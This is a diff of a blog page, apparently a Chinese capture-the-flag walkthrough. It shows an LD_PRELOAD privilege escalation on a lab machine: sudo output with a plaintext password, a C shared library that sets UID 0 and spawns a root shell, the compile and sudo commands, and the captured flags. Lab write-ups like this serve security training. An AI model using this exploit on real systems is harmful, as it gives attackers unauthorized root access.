-<div class="highlight highlight-source-shell"><pre class="notranslate">xiix@Tryharder:<span class="pl-k">~</span>$ sudo -l
-[sudo] password <span class="pl-k">for</span> xiix: superxiix
-Matching Defaults entries <span class="pl-k">for</span> xiix on tryharder:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin<span class="pl-cce">\:</span>/usr/local/bin<span class="pl-cce">\:</span>/usr/sbin<span class="pl-cce">\:</span>/usr/bin<span class="pl-cce">\:</span>/sbin<span class="pl-cce">\:</span>/bin, env_keep+=LD_PRELOAD
+<pre lang="bash"><code>xiix@Tryharder:~$ sudo -l
+[sudo] password for xiix: superxiix
+Matching Defaults entries for xiix on tryharder:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+=LD_PRELOAD
 
 User xiix may run the following commands on tryharder:
-    (ALL <span class="pl-c1">:</span> ALL) /bin/whoami</pre></div>
-<p><strong>关键配置：</strong> <code class="notranslate">env_keep+=LD_PRELOAD</code></p>
-<p>这是一个典型的LD_PRELOAD提权场景。当sudo配置允许保留 <code class="notranslate">LD_PRELOAD</code> 环境变量时，可以通过预加载恶意共享库来劫持程序执行。</p>
+    (ALL : ALL) /bin/whoami
+</code></pre>
+<p><strong>关键配置：</strong> <code>env_keep+=LD_PRELOAD</code></p>
+<p>这是一个典型的LD_PRELOAD提权场景。当sudo配置允许保留 <code>LD_PRELOAD</code> 环境变量时，可以通过预加载恶意共享库来劫持程序执行。</p>
 <h3>LD_PRELOAD提权原理</h3>
-<p><code class="notranslate">LD_PRELOAD</code> 是Linux动态链接器的一个环境变量，用于在程序运行前预加载指定的共享库。当共享库中定义了 <code class="notranslate">_init()</code> 函数时，该函数会在程序main函数之前自动执行。</p>
+<p><code>LD_PRELOAD</code> 是Linux动态链接器的一个环境变量，用于在程序运行前预加载指定的共享库。当共享库中定义了 <code>_init()</code> 函数时，该函数会在程序main函数之前自动执行。</p>
 <h3>编写恶意共享库</h3>
-<div class="highlight highlight-source-c"><pre class="notranslate"><span class="pl-smi">xiix</span>@<span class="pl-s1">Tryharder</span>:/<span class="pl-s1">tmp$</span> <span class="pl-s1">cat</span> <span class="pl-s1">a</span>.<span class="pl-s1">c</span>
-<span class="pl-k">#include</span> <span class="pl-s">&lt;stdio.h&gt;</span>
-<span class="pl-k">#include</span> <span class="pl-s">&lt;sys/types.h&gt;</span>
-<span class="pl-k">#include</span> <span class="pl-s">&lt;stdlib.h&gt;</span>
+<pre lang="c"><code>xiix@Tryharder:/tmp$ cat a.c
+#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;stdlib.h&gt;
 
-<span class="pl-smi">void</span> <span class="pl-en">_init</span>() {
-    <span class="pl-en">unsetenv</span>(<span class="pl-s">"LD_PRELOAD"</span>);
-    <span class="pl-en">setresuid</span>(<span class="pl-c1">0</span>,<span class="pl-c1">0</span>,<span class="pl-c1">0</span>);
-    <span class="pl-en">system</span>(<span class="pl-s">"/bin/bash -p"</span>);
-}</pre></div>
+void _init() {
+    unsetenv(&quot;LD_PRELOAD&quot;);
+    setresuid(0,0,0);
+    system(&quot;/bin/bash -p&quot;);
+}
+</code></pre>
 <p><strong>代码说明：</strong></p>
 <ul>
 <li>
-<p><code class="notranslate">unsetenv("LD_PRELOAD")</code>：清除环境变量，避免子进程继承</p>
+<p><code>unsetenv(&quot;LD_PRELOAD&quot;)</code>：清除环境变量，避免子进程继承</p>
 </li>
 <li>
-<p><code class="notranslate">setresuid(0,0,0)</code>：设置真实、有效、保存的UID都为0（root）</p>
+<p><code>setresuid(0,0,0)</code>：设置真实、有效、保存的UID都为0（root）</p>
 </li>
 <li>
-<p><code class="notranslate">system("/bin/bash -p")</code>：启动一个保留特权的bash shell</p>
+<p><code>system(&quot;/bin/bash -p&quot;)</code>：启动一个保留特权的bash shell</p>
 <h3>编译共享库</h3>
-<div class="highlight highlight-source-shell"><pre class="notranslate">xiix@Tryharder:/tmp$ gcc -fPIC -shared -nostartfiles -o /tmp/a.so a.c
-a.c: In <span class="pl-k">function</span> <span class="pl-en">'_init':</span>
-a.c:6:5: warning: implicit declaration of <span class="pl-k">function</span> <span class="pl-en">'setresuid'</span> [-Wimplicit-function-declaration]
-     setresuid(0,0,0)<span class="pl-k">;</span>
-     ^~~~~~~~~</pre></div>
+<pre lang="bash"><code>xiix@Tryharder:/tmp$ gcc -fPIC -shared -nostartfiles -o /tmp/a.so a.c
+a.c: In function '_init':
+a.c:6:5: warning: implicit declaration of function 'setresuid' [-Wimplicit-function-declaration]
+     setresuid(0,0,0);
+     ^~~~~~~~~
+</code></pre>
 <p><strong>编译参数说明：</strong></p>
 <ul>
-<li><code class="notranslate">-fPIC</code>：生成位置无关代码（Position Independent Code）</li>
-<li><code class="notranslate">-shared</code>：生成共享库</li>
-<li><code class="notranslate">-nostartfiles</code>：不链接标准启动文件，因为我们使用 <code class="notranslate">_init()</code> 作为入口点</li>
+<li><code>-fPIC</code>：生成位置无关代码（Position Independent Code）</li>
+<li><code>-shared</code>：生成共享库</li>
+<li><code>-nostartfiles</code>：不链接标准启动文件，因为我们使用 <code>_init()</code> 作为入口点</li>
 </ul>
 <h3>执行提权</h3>
-<div class="highlight highlight-source-shell"><pre class="notranslate">xiix@Tryharder:/tmp$ sudo LD_PRELOAD=/tmp/a.so /bin/whoami
+<pre lang="bash"><code>xiix@Tryharder:/tmp$ sudo LD_PRELOAD=/tmp/a.so /bin/whoami
 root@Tryharder:/tmp# id
-uid=0(root) gid=0(root) groups=0(root)</pre></div>
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
 <p>**提权成功！**获得root权限。</p>
-<hr>
+<hr />
 <h1>六、获取Flag</h1>
-<div class="highlight highlight-source-shell"><pre class="notranslate">root@Tryharder:/tmp# cat /root/root.txt /home/pentester/user.txt
+<pre lang="bash"><code>root@Tryharder:/tmp# cat /root/root.txt /home/pentester/user.txt
 Flag{7ca62df5c884cd9a5e5e9602fe01b39f9ebd8c6f}
-Flag{c4f9375f9834b4e7f0a528cc65c055702bf5f24a}</pre></div>
+Flag{c4f9375f9834b4e7f0a528cc65c055702bf5f24a}
+</code></pre>
 <p><strong>成功获取所有Flag！</strong></p>
 </li>
-</ul></div>
+</ul>
+</div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
@@ -517,7 +537,7 @@ if(""!=""){
 </script></div>
 </body>
 <script>
-var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z'};
 var utterancesLoad=0;
 
 console.log("\n %c Gmeek main https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
@@ -564,70 +584,7 @@ function iFrameLoading(){
     }
 }
 
-document.addEventListener('DOMContentLoaded', () => {
-    const createClipboardHTML = (codeContent, additionalClasses = '') => `
-        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
-        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
-            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
-                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
-                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
-            </clipboard-copy>
-            <div class="copy-feedback">Copied!</div>
-        </div>
-    `;
 
-    const handleCodeElements = (selector = '') => {
-        document.querySelectorAll(selector).forEach(codeElement => {
-            const codeContent = codeElement.innerHTML;
-            const newStructure = document.createElement('div');
-            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
-            newStructure.innerHTML = createClipboardHTML(codeContent);
-
-            const parentElement = codeElement.parentElement;
-            if (selector.includes('highlight')) {
-                parentElement.insertBefore(newStructure, codeElement.nextSibling);
-                parentElement.removeChild(codeElement);
-            } else {
-                parentElement.parentElement.replaceChild(newStructure, parentElement);
-            }
-        });
-    };
-
-    handleCodeElements('pre.notranslate > code.notranslate');
-    handleCodeElements('div.highlight > pre.notranslate');
-
-    let currentFeedback = null;
-    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
-        copyButton.addEventListener('click', () => {
-            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
-            const tempTextArea = document.createElement('textarea');
-            tempTextArea.value = codeContent;
-            document.body.appendChild(tempTextArea);
-            tempTextArea.select();
-            document.execCommand('copy');
-            document.body.removeChild(tempTextArea);
-
-            const copyIcon = copyButton.querySelector('.octicon-copy');
-            const checkIcon = copyButton.querySelector('.octicon-check');
-            const copyFeedback = copyButton.nextElementSibling;
-
-            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
-            currentFeedback = copyFeedback;
-
-            copyIcon.classList.add('d-none');
-            checkIcon.classList.remove('d-none');
-            copyFeedback.style.display = 'block';
-            copyButton.style.borderColor = 'var(--color-success-fg)';
-
-            setTimeout(() => {
-                copyIcon.classList.remove('d-none');
-                checkIcon.classList.add('d-none');
-                copyFeedback.style.display = 'none';
-                copyButton.style.borderColor = '';
-            }, 2000);
-        });
-    });
-});
 
 </script>
 </script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>
